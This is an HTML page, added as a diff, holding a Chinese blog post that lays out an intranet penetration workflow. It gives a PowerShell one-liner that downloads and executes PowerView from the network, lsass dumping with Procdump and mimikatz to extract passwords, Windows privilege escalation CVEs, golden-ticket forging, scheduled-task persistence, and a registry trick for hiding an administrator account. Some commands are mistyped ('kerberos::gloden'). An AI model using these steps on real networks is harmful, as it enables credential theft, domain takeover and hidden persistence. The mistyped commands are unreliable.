@@ -1,0 +1,312 @@
+<!DOCTYPE HTML>
+<html>
+
+<head><meta name="generator" content="Hexo 3.8.0">
+	<link rel="bookmark" type="image/x-icon" href="/img/logo_miccall.png">
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    Kaler
+    </title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <link rel="stylesheet" href="/css/mic_main.css">
+    <link rel="stylesheet" href="/css/dropdownMenu.css">
+    <meta name="keywords" content="Kaler">
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css">
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+</head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css">
+<link rel="stylesheet" href="/css/typo.css">
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Go TOP</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special">
+            <ul class="menu links">
+			<!-- Homepage  主页  --> 
+			<li>
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </li></ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/about/" title="简历">
+		                简历
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/group/" title="团队">
+		                团队
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://www.Kaleryou.github.io" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a title="Game" href="/www.4399.com" target="_blank" rel="noopener">
+                            <i class="icon fa fa-Game"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main">
+            <div class="post_page_title_img" style="height: 25rem;background-image: url(http://pics.sc.chinaz.com/files/pic/pic9/201811/zzpic15287.jpg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;">
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2>内网渗透的一般流程</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <blockquote>
+<p>题外话：最近内网渗透几乎用不上，写报告太多，这应该是18年最后一篇内网渗透相关的博客了。推荐多关注逻辑漏洞的挖掘，不仅很容易挖，而且厂商对于这方面很重视。不过一般漏洞平台的渗透工程师在项目上首要挖掘的就是逻辑漏洞和SQL注入，所以互联网漏洞一般来说SQL注入很少，逻辑漏洞也还可观。这两个月会根据互联网情报写一篇逻辑漏洞的实例汇集。</p>
+</blockquote>
+<h3 id="特殊针对："><a href="#特殊针对：" class="headerlink" title="特殊针对："></a>特殊针对：</h3><p>进入内网最简单的方法就是利用JBoss,Weblogic,Websphere等有可能有JAVA反序列化的使用JAVA反序列化工具获取shell</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>注意：如果在一些PC上无执行powershell，可能是因为powershell默认关闭执行脚本，执行以下操作以开启Ps策略，开启策略的过程又有UAC Bypass的操作</p>
+<p>查看当前策略：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ExecutionPolicy</span><br></pre></td></tr></table></figure>
+<p>  若为Restricted则默认不执行脚本</p>
+<p>更改策略(需要管理员权限,可UAC Bypass绕过)：</p>
+<p>set-executionpolicy</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">键入：</span><br><span class="line">set-executionpolicy</span><br></pre></td></tr></table></figure>
+<p>相关信息查看命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Powershell.exe -Nop -NonI -Exec Bypass &quot;IEX (New.ObjectNet.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1&apos;);Get-HostIP&quot;</span><br><span class="line"></span><br><span class="line">Get-NetDomain                   -   gets the name of the current user&apos;s domain Get-NetForest                   -   gets the forest associated with the current user&apos;s domain </span><br><span class="line">Get-NetForestDomains            -   gets all domains for the current forest </span><br><span class="line">Get-NetDomainControllers        -   gets the domain controllers for the current computer&apos;s domain </span><br><span class="line">Get-NetCurrentUser              -   gets the current [domain\]username </span><br><span class="line">Get-NetUser                     -   returns all user objects, or the user specified (wildcard specifiable) </span><br><span class="line">Get-NetUserSPNs                 -   gets all user ServicePrincipalNames </span><br><span class="line">Get-NetOUs                      -   gets data for domain organization units </span><br><span class="line">Get-NetGUIDOUs                  -   finds domain OUs linked to a specific GUID </span><br><span class="line">Invoke-NetUserAdd               -   adds a local or domain user </span><br><span class="line">Get-NetGroups                   -   gets a list of all current groups in the domain</span><br><span class="line">Get-NetGroup                    -   gets data for each user in a specified domain group </span><br><span class="line">Get-NetLocalGroups              -   gets a list of localgroups on a remote host or hosts </span><br><span class="line">Get-NetLocalGroup               -   gets the members of a localgroup on a remote host or hosts </span><br><span class="line">Get-NetLocalServices            -   gets a list of running services/paths on a remote host or hosts </span><br><span class="line">Invoke-NetGroupUserAdd          -   adds a user to a specified local or domain group </span><br><span class="line">Get-NetComputers                -   gets a list of all current servers in the domain </span><br><span class="line">Get-NetFileServers              -   get a list of file servers used by current domain users </span><br><span class="line">Get-NetShare                    -   gets share information for a specified server </span><br><span class="line">Get-NetLoggedon                 -   gets users actively logged onto a specified server</span><br><span class="line">Get-NetSessions                 -   gets active sessions on a specified server Get-NetFileSessions             -   returned combined Get-NetSessions and Get-NetFiles</span><br><span class="line">Get-NetConnections              -   gets active connections to a specific server resource (share) </span><br><span class="line">Get-NetFiles                    -   gets open files on a server </span><br><span class="line">Get-NetProcesses                -   gets the remote processes and owners on a remote server</span><br></pre></td></tr></table></figure>
+<h3 id="内网凭证获取"><a href="#内网凭证获取" class="headerlink" title="内网凭证获取"></a>内网凭证获取</h3><p>前提是需要获取域主机的主机名和IP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dsquery server   ===得到主机名</span><br><span class="line"></span><br><span class="line">ping 主机名  =====得到IP</span><br><span class="line"></span><br><span class="line">获取windoes HASH</span><br><span class="line"></span><br><span class="line">存在本地SAM数据库中或者在域控NTDS.dit</span><br><span class="line"></span><br><span class="line">Procdump+mimikaz提取用户hash</span><br></pre></td></tr></table></figure>
+<p><a href="http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">Procdump下载链接点击此</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">首先在任务管理器中转储进程lsass</span><br><span class="line"></span><br><span class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::minidump lsass.dmp</span><br><span class="line"></span><br><span class="line">Switch to MINIDUMP</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="运行管理员CMD"><a href="#运行管理员CMD" class="headerlink" title="运行管理员CMD"></a>运行管理员CMD</h4><p>利用CVE-2017-0213</p>
+<h4 id="获取域管权限"><a href="#获取域管权限" class="headerlink" title="获取域管权限"></a>获取域管权限</h4><p>利用MS14-068和MS16-032</p>
+<p><img src="C:/Users/root/AppData/Local/YNote/data/m17803870587@163.com/aad9d8f5f66144cd88c02d764b581db7/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181025231153.png" alt="img"></p>
+<h4 id="黄金票据的伪造"><a href="#黄金票据的伪造" class="headerlink" title="黄金票据的伪造"></a>黄金票据的伪造</h4><p>Kerberos黄金票据是有效的TGT Kerberos票据，因为它是由<a href="http://adsecurity.org/?p=483" target="_blank" rel="noopener">域Kerberos帐户（KRBTGT）</a>加密和签名的  。    TGT仅用于向域控制器上的KDC服务证明用户已被其他域控制器认证。TGT被KRBTGT密码散列加密并且可以被域中的任何KDC服务解密的。</p>
+<h5 id="获取黄金票据前提"><a href="#获取黄金票据前提" class="headerlink" title="获取黄金票据前提"></a>获取黄金票据前提</h5><p><strong>在域控上用mimikaz提取</strong></p>
+<p><strong>伪造黄金票据</strong></p>
+<p>黄金票据的条件要求：</p>
+<p>1.域名称[AD PowerShell模块：（Get-ADDomain）.DNSRoot] </p>
+<p>2.域的SID 值[AD PowerShell模块：（Get-ADDomain）.DomainSID.Value] </p>
+<p>3.域的KRBTGT账户NTLM密码哈希</p>
+<p>4.伪造用户名</p>
+<p>一旦攻击者拥有管理员访问域控制器的权限，就可以使用Mimikatz来提取KRBTGT帐户密码哈希值。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::gloden /user:Administrator /domain:xxx.xxx.xxx /sid:xxxxxxxxxxxxx krbtgt:ntlm-hashvlaue /ticket:test.kribi</span><br></pre></td></tr></table></figure>
+<p>黄金票据的使用</p>
+<p>#  导入票据 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz::ptt test.kribi</span><br></pre></td></tr></table></figure>
+<p> #检验缓存票据 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrastor&gt; klist</span><br></pre></td></tr></table></figure>
+<p>   #利用票据访问 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrastor&gt; net use \\xx.domain-name dir \\xx.domain-name\c$</span><br></pre></td></tr></table></figure>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>使用Python脚本的web服务器，可在内网中使用上传下载文件</p>
+<p>Start-Webserver.ps1</p>
+<p>默认8080端口，通过以下命令更改端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./start-webserver.ps1 &quot;http://IP:8888&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="权限维持-后门"><a href="#权限维持-后门" class="headerlink" title="权限维持-后门"></a>权限维持-后门</h3><h4 id="schtasks型后门，创建一个用户开机自启的命令"><a href="#schtasks型后门，创建一个用户开机自启的命令" class="headerlink" title="schtasks型后门，创建一个用户开机自启的命令"></a>schtasks型后门，创建一个用户开机自启的命令</h4><p><img src="C:/Users/root/AppData/Local/YNote/data/m17803870587@163.com/da2e3db40e2940a1adeba681d1107122/b8f3f69cf28f4f38a680a739160c440d.jpg" alt="img"></p>
+<h4 id="隐藏用户的建立"><a href="#隐藏用户的建立" class="headerlink" title="隐藏用户的建立"></a>隐藏用户的建立</h4><p>1.建立$结尾用户</p>
+<p>2.将注册表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SAM\SAM\Domain\Account\Users\000003EB(isc2018$)</span><br></pre></td></tr></table></figure>
+<p>下键F的值替换为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SAM\SAM\Domain\Account\Users\000001F4(administrator)</span><br></pre></td></tr></table></figure>
+<p>下键F的值，删除$结尾用户，再导入修改后的注册表即可隐藏该用户</p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://yoursite.com/2018/11/26/内网渗透的一般流程/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://yoursite.com/2018/11/26/内网渗透的一般流程/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//http-miccall-tech.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
